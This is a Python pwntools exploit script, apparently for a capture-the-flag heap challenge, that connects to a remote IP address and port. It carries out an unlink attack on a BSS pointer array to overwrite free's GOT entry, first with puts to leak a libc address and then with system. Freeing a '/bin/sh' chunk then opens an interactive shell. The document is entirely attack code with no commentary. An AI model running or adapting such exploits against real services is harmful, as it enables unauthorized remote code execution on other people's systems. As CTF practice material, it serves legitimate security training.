from pwn import log as Log
from pwn import *
from time import sleep
period = 0.4
puts_plt = 0x400730

start = 0x4007d0
pop_rdi = 0x0000000000400f13
main_start_got = 0x0000000000601ff0
free_got = 0x0000000000602018
bss = 0x602100
def log(title,value):
	Log.info(title + ": {} ".format(hex(value)))
#p = process("./main")
p = remote("34.230.60.174",1337)
def new_page(size):
	p.sendline("1")
	sleep(period)
	p.recv(8000)
	p.sendline(str(size))
	sleep(period)
	p.recv(8000)

def edit(index,data):
	p.sendline("2")
	sleep(period)
	p.recv(8000)
	p.sendline(str(index))
	sleep(period)
	p.recv(8000)
	p.send(data)
	sleep(period)
	p.recv(8000)

def delete_page(index):
	p.sendline("3")
	sleep(period)
	p.recv(8000)
	p.sendline(str(index))
	sleep(period)
	p.recv(8000)

def login(size,name):
	p.recv(8000)
	p.sendline(str(size))
	sleep(period)
	p.recv(8000)
	p.send(name)
	sleep(period)
	p.recv(8000)

def relogin(name):
	p.sendline("4")
	sleep(period)
	p.recv(8000)
	p.send(name)
	sleep(period)
	p.recv(8000)
def Exit():
	p.sendline("5")
	sleep(period)

def delete_leak(index):
	p.sendline("3")
	sleep(period)
	p.recv(8000)
	p.sendline(str(index))
	sleep(period)


login(8,"/bin/sh\x00")
for _ in range(7):
	new_page(0x128)
	delete_page(0)
new_page(0x128)
new_page(0x128)
delete_page(0)
#pause()
edit(0,p64(0) + p64(0x121) + p64(bss-0x18) + p64(bss - 0x10) + "A"*0x100 + p64(0x120))
delete_page(1)
edit(0,p32(1) + p32(0) + p64(0)*2 + p64(bss-0x18) + p64(free_got) + p64(main_start_got))
edit(1,p64(puts_plt))
delete_leak(2)
leak = p.recvline().strip()
p.recv(8000)
leak = u64(leak.ljust(8,"\x00"))
base = leak - 0x0000000000021ab0
system = base + 0x000000000004f4e0
log("leak",leak)
log("base",base)
log("system",system)
edit(0,p32(1) + p32(0) + p64(0)*2 + p64(bss-0x18) + p64(free_got) + p64(0x602130))
edit(1,p64(system))
#pause()
delete_leak(2)
p.interactive()

